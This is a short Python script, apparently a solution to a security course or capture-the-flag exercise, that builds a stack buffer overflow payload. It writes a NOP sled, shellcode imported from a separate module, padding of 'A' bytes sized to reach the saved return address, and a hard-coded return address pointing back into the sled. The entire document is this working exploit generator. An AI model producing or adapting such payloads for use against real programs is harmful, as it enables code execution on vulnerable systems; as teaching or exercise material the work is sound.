#!/usr/bin/env python3

import sys
from shellcode import shellcode
from struct import pack

sys.stdout.buffer.write(b'\x90'*0x100)
sys.stdout.buffer.write(shellcode)
sys.stdout.buffer.write(b'\x41'*(0x408+4-0x100-23))
sys.stdout.buffer.write(pack('<I', 0xfffedd60))
